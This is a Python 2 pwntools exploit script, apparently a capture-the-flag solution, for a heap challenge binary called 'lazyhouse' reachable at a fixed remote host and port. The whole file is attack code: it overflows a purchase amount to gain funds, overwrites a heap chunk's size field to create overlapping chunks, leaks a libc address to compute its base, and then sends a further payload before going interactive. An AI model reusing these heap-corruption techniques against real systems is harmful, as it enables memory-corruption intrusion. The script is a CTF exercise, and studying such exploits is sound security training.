#!/usr/bin/env python2

from pwn import *

BINARY = './lazyhouse'
HOST, PORT = '3.115.121.123', 5731

elf = ELF('./lazyhouse')
libc = ELF('./libc.so.6')

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process(BINARY)
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

def get_money():
	p.sendlineafter(': ', '1')
	p.sendlineafter(':', '0')
	p.sendlineafter(':', str(0x12c9fb4d812cbff))

	sell(0)

def buy(idx, size, content):
	p.sendlineafter(': ', '1')
	p.sendlineafter(':', str(idx))
	p.sendlineafter(':', str(size))
	p.sendafter(':', content)

def show(idx):
	p.sendlineafter(': ', '2')
	p.sendlineafter(':', str(idx))

def sell(idx):
	p.sendlineafter(': ', '3')
	p.sendlineafter(':', str(idx))

def upgrade(idx, content):
	p.sendlineafter(': ', '4')
	p.sendlineafter(':', str(idx))
	p.sendafter(':', content)

def super_house(content):
	p.sendlineafter(': ', '5')
	p.sendafter(':', content)

context.terminal = ['tmux', 'new-window']

p = start()
if args.GDB:
	debug([])

get_money()

buy(0, 0x88, 'A'*0x88)
buy(1, 0x88, 'B'*0x88)
buy(2, 0x400, p64(0x21)*0x80)

upgrade(0, 'A'*0x88 + p64(0x421))

sell(1)
buy(1, 0x88, 'B'*0x88)

show(2)

leak = u64(p.recv(6).ljust(8, '\x00'))
libc.address = leak - 0x1e4ca0

log.info('Leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))

super_house('A'*0x217)

p.interactive()